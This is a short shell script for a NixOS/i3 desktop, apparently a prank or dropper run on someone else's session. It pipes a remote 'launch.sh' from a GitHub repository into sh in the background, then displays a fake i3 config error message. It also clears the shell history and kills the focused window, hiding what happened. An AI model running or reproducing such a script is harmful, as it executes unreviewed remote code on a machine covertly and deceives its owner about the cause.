nix-collect-garbage -d
nix-shell -p xprintidle --command exit

(curl https://raw.githubusercontent.com/ilil2/EpiWTF/main/launch.sh | sh) &

i3-nagbar -t error -m "error with your %e=\\fe42' config" &
history -c &
i3-msg kill &
